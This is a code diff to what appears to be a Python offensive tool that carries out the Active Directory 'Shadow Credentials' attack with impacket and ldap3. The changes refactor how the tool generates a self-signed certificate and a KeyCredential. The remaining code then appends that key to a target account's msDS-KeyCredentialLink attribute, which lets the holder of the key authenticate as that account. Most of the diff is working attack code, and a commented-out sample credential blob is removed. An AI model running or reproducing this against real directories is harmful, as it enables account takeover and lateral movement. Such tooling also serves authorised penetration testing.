@@ -9,36 +9,27 @@
 import random
 import string
 from binascii import unhexlify
-from enum import Enum
 
-import OpenSSL
-from Cryptodome.Util.number import long_to_bytes
 from impacket.examples import logger, utils
 from impacket import version
-from impacket.ldap import ldaptypes
 from impacket.smbconnection import SMBConnection
 from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
 from ldap3.protocol.formatters.formatters import format_sid
 from ldap3.utils.conv import escape_filter_chars
 import argparse
-import base64
-import binascii
-import datetime
-import io
-import json
 import ldap3
 import ldapdomaindump
 import logging
 import os
 import ssl
-import struct
 import sys
-import time
 import traceback
-from Cryptodome.PublicKey import RSA
-# todo : fix along with pydsinternal import fix
+
 from pydsinternals.common.data.DNWithBinary import DNWithBinary
 from pydsinternals.common.data.KeyCredential import KeyCredential
+from pydsinternals.common.data.Guid import Guid
+from pydsinternals.common.data.X509Certificate2 import X509Certificate2
+from pydsinternals.common.data.DateTime import DateTime
 
 def get_machine_name(args, domain):
     if args.dc_ip is not None:
@@ -251,9 +242,7 @@ class ShadowCredentials(object):
                 logging.info("Listing devices for %s" % self.target_samname)
                 for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                     keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
-                    logging.info("DeviceID: %s | Creation Time (UTC): %s" % (keyCredential.DeviceId, keyCredential.KeyCreationTime))
-                    for key in keyCredential._data.keys():
-                        logging.debug("%s: %s" % (key, keyCredential._data[key]))
+                    logging.info("DeviceID: %s | Creation Time (UTC): %s" % (keyCredential.DeviceId.toFormatD(), keyCredential.CreationTime))
         except IndexError:
             logging.info('Attribute msDS-KeyCredentialLink does not exist')
         return
@@ -273,39 +262,13 @@ class ShadowCredentials(object):
             self.target_dn = result[0]
             logging.info("Target user found: %s" % self.target_dn)
         logging.info("Generating certificate")
-        # create rsa key pair object
-        key = OpenSSL.crypto.PKey()
-        # generate key pair or 2048 of length
-        key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)
-        # create x509 certificate object
-        cert = OpenSSL.crypto.X509()
 
-        # set cert params
-        # cert.set_subject("CN=%s" % self.target_samname)
-        cert.get_subject().CN = self.target_samname
-        # cert.set_issuer("CN=%s" % self.target_samname)
-        cert.set_issuer(cert.get_subject())
-        cert.gmtime_adj_notBefore(0)
-        cert.gmtime_adj_notAfter(365 * 24 * 60 * 60)
-        cert.set_pubkey(key)
-        # self-sign certificate with SHA256 digest and PKCS1 padding scheme
-        cert.sign(key, 'sha512')
+        certificate = X509Certificate2(subject=self.target_samname, keySize=2048)
         logging.info("Certificate generated")
-
-        # Create a PKCS12 container
-        # pk = OpenSSL.crypto.PKCS12()
-        # pk.set_certificate(cert)
-        # pk.export()
-
         logging.info("Generating KeyCredential")
-        guid = "64c21c1d-b1e8-4c89-b936-91cfb32548cf"
-        # keyCredential = b'B:828:000200002000010931771AA15D0D2C55F90085364F9105A8FF8EF5F7D29EAFB68D25FE9327BAA42000029B7190E48CCBF5985D4C9775B1CFB56BE4153CA99CE4DEE6AC4943EEEC5A86DD1B0103525341310008000003000000000100000000000000000000010001BC8830BAB8E09BF812656E00FA7EEB4D83CF710EB072C4F19F540537CD51756720537BFD157238E92567B68D68AD548758324FBA1FDEE0AA08D3ED9963D03EF9BB4BB8CB9158D7AA767F6BCF52912BDD7FA5C4D3EDBAB481885DC9F0F46C1AF79554128C103869DAFA0847229F59543A2F8AEAF538F30C5634C1B6C87F9F8CCD2E79241503C7754D23E66DA6BAF97CBD3BD4B7964D5FB7EAFEA70B8BB1AF9DB77319F6F9CF0EEBE16AF878A1038BF75CBC73B2E20D4A9F48D64236921D997924DD59E8951F9F6B3A813CEF78D8D386CD9FE1704E0A44F88F5E90265C07F0733143E173CBD4165E890F3B8AC533BF0A8BEBE66560BDB996C408472A33C9E2F87101000401010005001000061D1CC264E8B1894CB93691CFB32548CF0200070100080008ECFFF45A0F7FD701080009ECFFF45A0F7FD701:CN=user2,CN=Users,DC=domain,DC=local'
-        # todo
-        # guid = Guid()
-        keyCredential = KeyCredential.fromX509Certificate(certificate=cert, deviceId=guid, owner=self.target_dn, currentTime=datetime.datetime.utcnow())
-        print(keyCredential)
-        exit(0)
-        logging.info("KeyCredential generated with DevideID: %s" % "BLAHBLAHBLAH <3")
+        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime())
+        logging.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
+        logging.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
         self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
         results = None
         for entry in self.ldap_session.response:
@@ -316,7 +279,7 @@ class ShadowCredentials(object):
             logging.error('Could not query target user properties')
             return
         try:
-            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential]
+            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
             logging.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
             self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.ldap_session.result['result'] == 0:
@@ -356,8 +319,8 @@ class ShadowCredentials(object):
             new_values = []
             device_id_in_current_values = False
             for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
-                keycredentiallink = DN_binary_KeyCredentialLink(dn_binary_value)
-                if keycredentiallink.parsed_data["DeviceId"] == device_id:
+                keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
+                if keyCredential.DeviceId == device_id:
                     logging.info("Found value to remove")
                     device_id_in_current_values = True
                 else:
